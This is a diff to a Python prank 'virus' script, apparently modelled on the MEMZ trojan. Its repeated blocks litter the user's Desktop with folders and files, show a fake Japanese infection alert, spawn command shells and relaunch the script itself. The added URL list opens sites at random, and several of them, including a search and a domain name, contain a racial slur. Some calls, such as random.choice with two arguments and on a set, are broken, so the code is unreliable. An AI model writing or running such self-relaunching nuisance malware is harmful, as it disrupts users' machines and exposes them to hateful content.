@@ -7,11 +7,55 @@ import threading
 import pygame
 import random
 import os
+import time
+from time import sleep
+import webbrowser
 
 pygame.init()
 pygame.mixer.init()
-errorsound = pygame.mixer.Sound('audio/error.mp3')
+errorsound = pygame.mixer.Sound('audio/error.wav')
 
+
+
+sites = {
+  "https://headshot.monster/CCOCZW",
+  "https://google.co.ck/search?q=you+are+a+nigger",
+  "http://google.co.ck/search?q=chevrolet+spark+pricing",
+  "http://google.co.ck/search?q=daewoo+matiz",
+  "https://freches.neocities.org",
+  "https://reddit.com/r/tomorrow",
+  "https://reddit.com/r/askreddit",
+  "nigger.com",
+  "https://google.com/search?q=rats+when+they+see+a+kfc+deep+fryer",
+  "http://google.co.ck/search?q=nigger.com",
+  "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
+  "http://google.co.ck/search?q=g3t+r3kt",
+  "http://google.co.ck/search?q=batch+virus+download",
+  "http://google.co.ck/search?q=virus.exe",
+  "http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
+  "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
+  "http://google.co.ck/search?q=virus+builder+legit+free+download",
+  "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
+  "http://google.co.ck/search?q=how+to+remove+memz+trojan+virus",
+  "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
+  "http://google.co.ck/search?q=dank+memz",
+  "http://google.co.ck/search?q=how+to+download+memz",
+  "http://google.co.ck/search?q=mario+3+release+date",
+  "http://google.co.ck/search?q=beamng+download+free",
+  "http://google.co.ck/search?q=is+illuminati+real",
+  "http://google.co.ck/search?q=montage+parody+making+program+2016",
+  "http://google.co.ck/search?q=the+memz+are+real",
+  "http://google.co.ck/search?q=stanky+danky+maymays",
+  "http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
+  "http://google.co.ck/search?q=vinesauce+meme+collection",
+  "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
+  "http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
+  "http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
+  "http://play.clubpenguin.com",
+  "http://pcoptimizerpro.com",
+  "http://softonic.com",
+  "http://google.co.ck/search?q=ask+poggersbutnot#4543"
+}
 
 
 
@@ -23,108 +67,77 @@ def pythonopen():
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
+  webbrowser.open(random.choice(sites))
   subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
   subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
   desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
   subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
   messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
   errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
-  subprocess.run('cmd', shell=True, stderr=subprocess.PIPE)
-  subprocess.run('python virus.py', shell=True, stderr=subprocess.PIPE)
-  desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-  subprocess.run(f'cd {desktop} & mkdir aarrvirus😈{random.choice(0,999999999)}　& cd aarrvirus{random.choice(0,999999999)} & type nul > aarr{random.choice(0,999999999)}.txt', shell=True, stderr=subprocess.PIPE)
-  messagebox.showerror('os error', 'パソコンがウイルスに侵入されています。')
-  errorsound.play()
+  webbrowser.open(random.choice(sites))
 
 
 def imageopen():
@@ -140,6 +153,10 @@ def imageopen():
                 image=image  # 表示画像データ
                 )
   root.mainloop()
+
+
+
+
 
 
 
